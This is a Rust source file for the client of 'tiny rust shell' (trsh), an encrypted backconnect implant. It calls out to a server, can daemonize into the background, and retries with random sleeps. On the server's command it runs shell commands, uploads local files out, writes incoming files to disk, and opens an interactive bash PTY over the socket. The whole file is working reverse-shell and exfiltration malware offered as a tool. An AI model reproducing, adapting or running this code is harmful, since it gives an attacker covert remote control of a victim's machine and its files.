// Copyright (c) 2021 asisdrico <asisdrico@outlook.com>
//
// Licensed under the MIT license
// <LICENSE or http://opensource.org/licenses/MIT>, at your
// option. This file may not be copied, modified, or distributed
// except according to those terms.

//! trsh client is the backconnect client of the tiny rust shell
//! when started without options the client runs in foreground,
//! trying a backconnect to the default server_addr unless otherwise
//! stated when starting the client with:
//! ./client <ip:port>
//! the following env variables can be set:
//! TRSH_NOLOOP=1 to make a one shot backconnect
//! TRSH_DAEMON=1 to run in the background
//! 
//! the keys for encryption are set in build.rs

use cryptolib::cryptolib_salsa::Crypto;
use std::env;
use std::io::BufReader;
use std::net::SocketAddr;
use std::net::TcpStream;
use std::path;
use std::process;
use std::process::{Command, Stdio};
use std::{
    fs::File,
    io::prelude::*,
    sync::mpsc::{self, Receiver, Sender},
};

use rand::{thread_rng, Rng};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::os::unix::process::CommandExt;
use std::{thread, time};

use daemonize::Daemonize;

/// key for the encryption - 16 bytes for aes128 - 32 bytes for salsa20
const KEY: &'static [u8] = env!("TRSH_KEY").as_bytes();
/// iv for the encryption - 16 bytes for aes128 - 8 bytes for salsa20
const IV: &'static [u8] = env!("TRSH_IV").as_bytes();

/// id of the client, checked by server
const ID: &'static str = env!("TRSH_ID");

/// sleep minimum time in seconds
const SLEEP_MIN: u32 = 5;
/// sleep maximum time in seconds
const SLEEP_MAX: u32 = 15;

/// starting point of the client
fn main() {
    let daemonize = env::var("TRSH_DAEMON").is_err();
    if !daemonize {
        let daemon = Daemonize::new().working_directory(".");
        daemon.start().expect("could not daemonize");
    }

    let mut server_addr = "127.0.0.1:4444";

    let mut args: Vec<String> = env::args().collect();
    println!("{:?} / {}", args, args.len());

    if args.len() == 2 {
        server_addr = args[1].as_mut_str();
    }

    let server_addr = server_addr
        .parse::<SocketAddr>()
        .unwrap_or_else(|e| panic!(r#"--server_addr value "{}" invalid: {}"#, server_addr, e));

    let noloop = env::var("TRSH_NOLOOP").is_err();

    let mut rng = thread_rng();
    loop {
        println!("Connecting to ... {}", &server_addr);
        match TcpStream::connect(&server_addr) {
            Ok(s) => {
                if !noloop {
                    handle_command_plain(s);
                } else {
                    thread::spawn(move || handle_command_plain(s));
                }
            }
            Err(e) => {
                println!("no connection ... {}", e);
            }
        };

        if !noloop {
            process::exit(0);
        }
        let n: u32 = rng.gen_range(SLEEP_MIN..SLEEP_MAX);
        let sleep_time = time::Duration::from_secs(n.into());

        println!("Sleeping for {:?} seconds ...", sleep_time);
        thread::sleep(sleep_time);
    }
}

/// handles the incoming command from the server
fn handle_command_plain(mut stream: TcpStream) {
    let mut cr = Crypto::new(KEY, IV).unwrap();
    let mut buffer = [0; 1024];

    cr.write(ID.as_bytes()).unwrap();

    println!("Len CR Buffer: {}", cr.buffer().len());

    stream.write(&cr.buffer()).unwrap();
    stream.flush().unwrap();

    let bytes_read = stream.read(&mut buffer).unwrap();
    cr.read(&mut buffer).unwrap();
    println!("read bytes: {}", bytes_read);

    let cmd = String::from_utf8_lossy(&cr.buffer()[..bytes_read]);

    println!("Command: {}", cmd);

    if cmd.starts_with("GET") {
        let v: Vec<&str> = cmd.split('|').collect();
        println!("GET {}", v[1]);
        let mut cr = Crypto::new(KEY, IV).unwrap();
        let input = match File::open(v[1]) {
            Ok(input) => input,
            Err(e) => {
                println!("Error opening file: {}", e);
                return;
            }
        };
        let mut bufreader = BufReader::new(input);
        let (tx, _rx): (Sender<u64>, Receiver<u64>) = mpsc::channel();
        match cr.copy_buf(&mut bufreader, &mut stream, &tx) {
            Ok(cnt) => println!("{} bytes were transferred", cnt),
            Err(e) => {
                println!("error copying data: {}", e);
                return;
            }
        };
        drop(bufreader);
    } else if cmd.starts_with("PUT") {
        let v: Vec<&str> = cmd.split('|').collect();
        println!("PUT {} to {}", v[1], v[2]);
        let mut cr = Crypto::new(KEY, IV).unwrap();
        let target_path = path::Path::new(v[2]).join(v[1]);
        let mut output = match File::create(target_path) {
            Ok(output) => output,
            Err(e) => {
                println!("Error creating file: {}", e);
                return;
            }
        };
        let (tx, _rx): (Sender<u64>, Receiver<u64>) = mpsc::channel();
        match cr.copy_buf(&mut stream, &mut output, &tx) {
            Ok(cnt) => println!("{} bytes were transferred", cnt),
            Err(e) => {
                println!("error copying data: {}", e);
                return;
            }
        };

        drop(output);
    } else if cmd.starts_with("SHELL") {
        let v: Vec<&str> = cmd.split('|').collect();
        println!("Allocating shell {}, {}", v[1], v[2]);
        let w = v[1].parse().expect("not a number");
        let h = v[2].parse().expect("not a number");
        allocate_shell(stream, w, h);
    } else {
        let child = Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd.to_string())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Could not execute command");

        cr = Crypto::new(KEY, IV).unwrap();
        let mut bufreader = BufReader::new(child.stdout.unwrap());
        cr.copy(&mut bufreader, &mut stream)
            .expect("could not read stdout");
    }
}

//allocate a shell
fn allocate_shell(s: TcpStream, w: u16, h: u16) {
    let mut s_reader = unsafe { File::from_raw_fd(s.as_raw_fd()) };
    let mut s_writer = s.try_clone().unwrap();
    
    use libc::winsize;

    let wsize = winsize {
        ws_row: h,
        ws_col: w,
        ws_xpixel: 0,
        ws_ypixel: 0,
    };
    use nix::pty;

    let npty = pty::openpty(Some(&wsize), None).expect("openpty failed");
    let master = npty.master;
    let slave = npty.slave;

    let mut cmd = Command::new("/bin/bash");
    cmd.arg("-i");
    cmd.stdin(unsafe { Stdio::from_raw_fd(slave) });
    cmd.stdout(unsafe { Stdio::from_raw_fd(slave) });
    cmd.stderr(unsafe { Stdio::from_raw_fd(slave) });
    unsafe {
        cmd.pre_exec(|| {
            let _ = libc::setsid();
            Ok(())
        })
    };

    let mut process = match cmd.spawn() {
        Ok(p) => p,
        Err(e) => panic!("Failed to execute process: {}", e),
    };

    println!("spawned {} on {}", process.id(), "PTY");

    let mut l_stdin = unsafe { File::from_raw_fd(master) };
    let mut l_stdout = unsafe { File::from_raw_fd(master) };

    ::std::thread::spawn(move || copyio(&mut s_reader, &mut l_stdin));
    ::std::thread::spawn(move || copyio(&mut l_stdout, &mut s_writer));

    let es = match process.wait() {
        Ok(e) => e,
        Err(e) => panic!("Error process wait: {}", e),
    };

    println!("quit {}", es);
}

// copies bytes from reader to writer
fn copyio(rin: &mut dyn Read, rout: &mut dyn Write) {
    let mut cr = Crypto::new(KEY, IV).unwrap();

    match cr.copy(rin, rout) {
        Ok(b) => b,
        Err(e) => {
            println!("Error copy: {}", e);
            return;
        }
    };
}
